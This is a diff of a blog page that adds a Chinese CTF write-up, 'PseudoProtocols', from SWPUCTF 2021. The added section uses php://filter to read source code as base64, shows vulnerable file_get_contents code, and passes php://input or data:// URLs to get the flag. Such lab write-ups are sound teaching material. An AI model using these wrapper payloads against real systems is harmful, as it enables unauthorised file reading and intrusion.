@@ -44,7 +44,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2022-11-20T03:59:26.000Z">
-<meta property="article:modified_time" content="2022-11-22T08:51:17.196Z">
+<meta property="article:modified_time" content="2022-11-24T12:58:54.579Z">
 <meta property="article:author" content="Chen">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -1627,7 +1627,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1669266572495),
+    lastupdate: new Date(1669294754591),
     sidebar: {
       for_page: ["blogger","category","tagcloud","text"],
       for_post: ["toc"],
@@ -2548,6 +2548,32 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>但是发现php文件扩展名还是可以上传成功的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php3，php5，pht，phtml，phps</span><br></pre></td></tr></table></figure>
 
+<h2 id="PseudoProtocols"><a href="#PseudoProtocols" class="headerlink" title="PseudoProtocols"></a>PseudoProtocols</h2><p>题目初始界面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint is hear Can you find out the hint.php?</span><br></pre></td></tr></table></figure>
+
+<p>然后看到url是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28411/index.php?wllm=</span><br></pre></td></tr></table></figure>
+
+<p>还不知道wllm有什么用 先进去hint.php看一看提示</p>
+<p>结果为空 结合题目描述 应该是file伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm=php://filter/convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></figure>
+
+<p>得到一串base64编码 解码后得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//go to /test2222222222222.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>跟进一下这个页面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>, <span class="string">&quot;180&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)) === <span class="string">&#x27;I want flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>file_get_contents这个函数是把文件r读入字符串</p>
+<p>这里有两种办法</p>
+<p>1.php:&#x2F;&#x2F;input</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sunsineq/article/details/105371129">https://blog.csdn.net/sunsineq/article/details/105371129</a></p>
+<p>他相当于强行以post的办法读入任意内容到a中</p>
+<p><img src="https://pic.imgdb.cn/item/637f6aea16f2c2beb11b122f.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/637f6aea16f2c2beb11b122f.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>2.data:&#x2F;&#x2F;</p>
+<p>data本身是数据封装器  以get的方式传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28411/test2222222222222.php?a=data://text/plain,I want flag</span><br></pre></td></tr></table></figure>
+
 
   </div>
   
@@ -2572,10 +2598,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-11-22T16:51:17+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-11-24T20:58:54+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Nov 22, 2022</p>
+    <p>更新于：Nov 24, 2022</p>
   </a>
 </div>
 
@@ -2718,7 +2744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#gift-F12"><span class="toc-text">gift_F12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jicao"><span class="toc-text">jicao</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-md5"><span class="toc-text">easy_md5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#caidao"><span class="toc-text">caidao</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyrce"><span class="toc-text">easyrce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyupload1-0"><span class="toc-text">easyupload1.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Do-you-know-http"><span class="toc-text">Do_you_know_http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyrce"><span class="toc-text">babyrce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#no-wakeup"><span class="toc-text">no_wakeup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-unserialize"><span class="toc-text">ez_unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyupload2-0"><span class="toc-text">easyupload2.0</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#gift-F12"><span class="toc-text">gift_F12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jicao"><span class="toc-text">jicao</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-md5"><span class="toc-text">easy_md5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#caidao"><span class="toc-text">caidao</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyrce"><span class="toc-text">easyrce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyupload1-0"><span class="toc-text">easyupload1.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Do-you-know-http"><span class="toc-text">Do_you_know_http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyrce"><span class="toc-text">babyrce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#no-wakeup"><span class="toc-text">no_wakeup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-unserialize"><span class="toc-text">ez_unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyupload2-0"><span class="toc-text">easyupload2.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PseudoProtocols"><span class="toc-text">PseudoProtocols</span></a></li></ol>
     </div>
   </section>
 
@@ -3292,7 +3318,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/web/","name":"web"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/11/20/SWPUCTF-2021-新生赛/","name":"SWPUCTF 2021 新生赛"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"SWPUCTF 2021 新生赛","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/11/20/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/11/20/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/","wordCount":0,"datePublished":"2022-11-20T03:59:26.000Z","dateModified":"2022-11-22T08:51:17.196Z","articleSection":"web","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/web/","name":"web"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/11/20/SWPUCTF-2021-新生赛/","name":"SWPUCTF 2021 新生赛"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"SWPUCTF 2021 新生赛","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/11/20/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/11/20/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/","wordCount":0,"datePublished":"2022-11-20T03:59:26.000Z","dateModified":"2022-11-24T12:58:54.579Z","articleSection":"web","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
